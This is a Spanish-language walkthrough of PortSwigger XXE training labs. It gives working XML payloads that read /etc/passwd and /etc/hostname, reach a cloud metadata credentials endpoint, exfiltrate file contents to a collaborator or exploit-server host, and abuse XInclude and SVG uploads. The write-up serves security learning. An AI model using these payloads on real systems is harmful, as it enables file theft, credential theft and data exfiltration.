---
title: XXE | PortSwigger
---
Labs de XXE hechos y explicados

#### Lab: Exploiting XXE using external entities to retrieve files

``` bash
# Creamos una endidad la cual posteriormete referenciaremos:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
# La referenciamos
    <productId>
        &xxe;
    </productId>
```
-------
#### Lab: Exploiting XXE to perform SSRF attacks

``` bash
# Hacemos lo mismo que en el paso anterior solo que esta vez apuntaremos a un directorio local de la maquina victima:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <productId>
        &xxe;
    </productId>
```
------
#### Lab: Blind XXE with out-of-band interaction

```
# Hacemos lo mismo que en el paso anterior pero esta vez le pasamos nuestra dirección del burp collaborator
```
--------
#### Lab: Blind XXE with out-of-band interaction via XML parameter entities

``` bash
# En este caso, no podemos referenciar la entidad XXE fuera de su ambito, por lo que obligatoriamente deberíamos hacerlo dentro del DTD:
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<COLABORATOR> "> %xxe; ]>
```
---------
#### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

``` bash
# en este caso nos pide mostrar la información del /etc/hostname de la máquina víctima, asi que haremos uso del exploit server para construir el exploit y mandarselo:
# Dentro del body del exploit, introducimos el siguiente codigo:
<!ENTITY % file SYSTEM "file:///etc/hostname"> # Cargamos la entidad externa llamada "file"
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>"> # Creamos una nueva entidad eval
%eval;
%exfil;
# Llamamos a las dos entidades al final para que el exploit funcione.
# Una vez tenemos el exploit creado, le damos a Store y luego view exploit --> Copiamos el link.
# Ahora interceptamos la peticion de check-stock de cualquier item y creamos una entidad XXE la cual llamará al link que contiene en exploit, de esta manera:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2f00dc04dc5edcc0375d0401780054.exploit-server.net/exploit"> %xxe;]>
# Finalmente, veremos una petición a nuestro burp-collaborator que contendrá el hostname de la máquina víctima.
```
-----------
#### Lab: Exploiting blind XXE to retrieve data via error messages

```
# Este ejercicio es casi indéntico al anterior. La diferencia está en que esta vez usaremos otra endidad XML llamada error, la cual cargará un file que no existe cuyo nombre contenga el valor de la entidad "file".
# Si nosotros introducimos un DTD simpley corriente, como por ejemplo: 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
# Nos tira un error. Por lo tanto, podemos aprovecharnos de este "error" para mostrar la información de otros archivos. 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
# Por lo tanto, cuando eval evalue la entidad error e intente cargar el archivo /nonexistent, y como este no existente , entra en juego el error y mostrará los valores del archivo /etc/passwd.
```
----------
#### Lab: Exploiting XInclude to retrieve files

```
#Si interceptamos la petición, no podemos ver ningun formato XML, asi que no podemos usar un DTD ni modificar el DOCTYPE, por lo que hemos de optar por XInclude. Para ello,
# Incluimos el siguiente codigo dentro del parámetro "productId":
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
-------
#### Lab: Exploiting XXE via image file upload

```
# En este caso, sabemos que existe una vulnerabilidad a la hora de subir un avatar (los cuales solo pueden ser subidos en formato SVG), así que vamos a crear un archivo SVG con codigo malicioso para sacar el /etc/hostname. Buscando, encontramos el siguiente código en PayloadAllTheThings
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
# Una vez subida la imagen, volvemos al post y la solución estará dentro de nuestro avatar,
```